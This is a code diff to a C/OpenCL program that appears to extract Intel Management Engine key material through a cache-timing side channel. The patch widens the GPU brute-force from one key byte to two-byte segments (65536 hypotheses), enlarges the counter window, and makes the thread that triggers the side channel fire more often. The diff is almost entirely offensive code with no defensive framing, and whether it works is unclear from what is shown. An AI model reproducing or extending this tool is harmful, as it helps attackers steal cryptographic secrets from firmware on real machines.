@@ -22,7 +22,7 @@
 #define INTEL_KEYWORD_COUNT 4
 #define MAX_CODE_SNIPPETS 5000
 #define NUM_MASKS 4
-#define PMC_WINDOW 10
+#define PMC_WINDOW 100
 
 // OpenCL Globals
 cl_context ctx;
@@ -99,19 +99,22 @@ void *l3_hardware_thread(void *arg) {
                 float anom_score; clEnqueueReadBuffer(cmd_q, dev_anom, CL_TRUE, 0, sizeof(float), &anom_score, 0, NULL, NULL);
                 if(anom_score > 1000000.0f) printf("\033[1;33m[ASIC L3 ALERT] Hardware Cache-Timing Anomaly!\033[0m\n");
                 
-                int num_hyp = 256;
+                int num_hyp = 65536; // Bruteforcing 2 bytes at a time (Massive Parallelism)
                 cl_mem dev_cr = clCreateBuffer(ctx, CL_MEM_WRITE_ONLY, sizeof(float) * num_hyp, NULL, NULL);
                 clSetKernelArg(me_crypto_k, 0, sizeof(cl_mem), &dev_pmc);
                 clSetKernelArg(me_crypto_k, 1, sizeof(cl_mem), &dev_cr);
                 clSetKernelArg(me_crypto_k, 2, sizeof(int), &win);
                 clSetKernelArg(me_crypto_k, 3, sizeof(int), &num_hyp);
                 size_t cgws = num_hyp; clEnqueueNDRangeKernel(cmd_q, me_crypto_k, 1, NULL, &cgws, NULL, 0, NULL, NULL);
-                float csc[256]; clEnqueueReadBuffer(cmd_q, dev_cr, CL_TRUE, 0, sizeof(csc), csc, 0, NULL, NULL);
+                
+                float *csc = malloc(sizeof(float) * num_hyp);
+                clEnqueueReadBuffer(cmd_q, dev_cr, CL_TRUE, 0, sizeof(float) * num_hyp, csc, 0, NULL, NULL);
                 
                 float mc = 0.0f; int bg = 0;
                 for(int i=0; i<num_hyp; i++) { if (csc[i] > mc) { mc = csc[i]; bg = i; } }
-                if (mc > 0.85f) printf("\033[1;36m[ASIC L6 CRYPTO] ME Key Byte %02X extracted! (Confidence: %.2f)\033[0m\n", bg, mc);
+                if (mc > 0.85f) printf("\033[1;36m[ASIC L6 CRYPTO] ME Key Segment %04X extracted! (Confidence: %.2f)\033[0m\n", bg, mc);
 
+                free(csc);
                 clReleaseMemObject(dev_pmc); clReleaseMemObject(dev_anom); clReleaseMemObject(dev_cr);
                 count = 0;
             }
@@ -129,9 +132,8 @@ void *me_activator_thread(void *arg) {
             unsigned char ping[] = {0x01, 0x00, 0x00, 0x00};
             write(fd, ping, sizeof(ping));
             close(fd);
-            // printf("[ASIC L6] ME Side-Channel Triggered.\n");
         }
-        sleep(30); // Trigger every 30 seconds
+        sleep(5); // Trigger every 5 seconds
     }
     return NULL;
 }
